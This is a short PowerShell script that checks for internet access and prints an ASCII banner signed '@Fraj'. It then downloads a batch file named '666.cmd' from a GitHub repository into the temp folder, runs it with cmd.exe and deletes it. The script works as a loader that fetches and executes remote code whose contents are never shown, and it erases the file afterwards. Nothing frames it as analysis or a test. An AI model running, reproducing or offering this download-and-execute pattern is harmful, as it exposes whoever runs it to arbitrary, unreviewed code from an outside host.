Clear-Host

# 1. Check internet connection first (pings GitHub / Cloudflare DNS quietly)
$isConnected = (Test-Connection -ComputerName "1.1.1.1" -Count 1 -Quiet) -or (Test-Connection -ComputerName "raw.githubusercontent.com" -Count 1 -Quiet)

if (-not $isConnected) {
    $errMsg = "   [!] MUST BE CONNECTED TO THE INTERNET : @Fraj   "
    $winWidth = $Host.UI.RawUI.WindowSize.Width
    $padSize = [Math]::Max(0, [Math]::Floor(($winWidth - $errMsg.Length) / 2))
    $pad = " " * $padSize

    Write-Host "`n`n"
    Write-Host $pad -NoNewline
    Write-Host $errMsg -ForegroundColor White -BackgroundColor DarkRed
    Write-Host "`n"
    return
}


$banner = @(
    "   ____    ______                _    __    __    __   "
    "  / __ \  |  ____|              (_)  / /   / /   / /   "
    " / / _`` | | |__    _ __   __ _   _  / /_  / /_  / /_   "
    "| | (_| | |  __|  | '__| / _`` | | || '_ \| '_ \| '_ \  "
    "| \__,_ | | |     | |   | (_| | | || (_) | (_) | (_) | "
    " \____/   |_|     |_|    \__,_| | | \___/ \___/ \___/  "
    "                               _/ |                    "
    "                              |__/                     "
)

$winWidth = $Host.UI.RawUI.WindowSize.Width
$boxWidth = $banner[0].Length
$padSize = [Math]::Max(0, [Math]::Floor(($winWidth - $boxWidth) / 2))
$pad = " " * $padSize

Write-Host ""
Write-Host ""

foreach ($line in $banner) {
    Write-Host $pad -NoNewline
    Write-Host $line -ForegroundColor Yellow -BackgroundColor Black
}

Write-Host ""
Write-Host ""

# 3. Download and execute 666.cmd
$url = "https://raw.githubusercontent.com/lenonschizophrenic-crypto/devil_named_Fraj/main/666.cmd"
$tempFile = "$env:TEMP\666.cmd"

Invoke-RestMethod -Uri $url -OutFile $tempFile
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempFile`"" -Wait
Remove-Item -Path $tempFile -Force
